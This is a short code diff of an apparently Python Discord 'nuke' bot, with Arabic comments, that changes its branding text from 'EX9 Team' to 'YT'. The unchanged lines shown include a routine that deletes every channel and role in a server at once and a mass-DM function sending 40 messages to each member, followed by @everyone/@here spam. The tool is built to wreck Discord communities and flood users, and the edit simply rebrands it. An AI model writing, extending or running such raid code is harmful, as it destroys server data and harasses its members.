@@ -53,7 +53,7 @@ async def on_ready():
 
 async def mass_dm(member):
     # إرسال 40 رسالة لكل عضو في الخاص بسرعة
-    msg = "✞𝐄𝐗𝟗┆𝐄𝐗𝟗 𝐓𝐞𝐚𝐦 𝐨𝐧 𝐭𝐨𝐩"
+    msg = "✞𝐄𝐗𝟗┆𝐘𝐓 𝐭𝐞𝐚𝐦 𝐨𝐧 𝐭𝐨𝐩"
     for _ in range(40):
         try:
             await member.send(msg)
@@ -119,8 +119,8 @@ async def main_menu(guild):
                 del_tasks = [obj.delete() for obj in all_channels + all_roles]
                 await asyncio.gather(*del_tasks, return_exceptions=True)
                 
-                n_name = "✞𝐄𝐗𝟗┆𝐄𝐗𝟗 𝐓𝐞𝐚𝐦 𝐨𝐧 𝐭𝐨𝐩"
-                n_msg = "**𝐄𝐗𝟗 𝐨𝐧 𝐭𝐨𝐩 @everyone × @here **"
+                n_name = "𝐘𝐓 𝐨𝐧 𝐭𝐨𝐩"
+                n_msg = "**𝐘𝐓 𝐨𝐧 𝐭𝐨𝐩 @everyone × @here **"
                 
                 # إرسال رسائل خاص لجميع الأعضاء (Mass DM)
                 print(f"{Fore.YELLOW}[!] Starting Mass DM to all members...")
